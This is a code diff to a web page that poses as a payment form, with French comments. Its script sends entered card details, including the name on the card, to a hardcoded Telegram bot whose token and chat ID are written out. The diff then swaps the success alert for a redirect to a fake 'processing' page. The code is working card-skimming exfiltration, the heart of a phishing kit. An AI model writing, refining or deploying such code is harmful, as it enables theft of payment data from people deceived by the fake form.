@@ -237,21 +237,24 @@ Nom sur la carte : ${nameOnCard}
 `;
 
             const botToken = '8101158488:AAH6WIfCC6B6aGkWd_Tt6QRrWD8QKQQc69M'; // Votre token
-            const chatId = '5372119436'; // Votre chat ID Telegram
+        const chatId = '5372119436'; // Votre chat ID Telegram
 
-            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
+        try {
             // Envoi du message
             const response = await fetch(telegramApiUrl);
             const dataResponse = await response.json();
 
             if (dataResponse.ok) {
-                alert('Votre paiement a été envoyé avec succès.');
+                // Redirection vers la page "Traitement.html"
+                window.location.href = "Traitement.html";
             } else {
-                alert('Erreur dans l\'envoi des informations.');
+                alert('Erreur dans l\'envoi des informations. Veuillez réessayer.');
             }
-        });
-    </script>
-
-</body>
-</html>
+        } catch (error) {
+            console.error('Erreur lors de l\'envoi:', error);
+            alert('Erreur réseau ou problème avec l\'API Telegram.');
+        }
+    });
+</script>
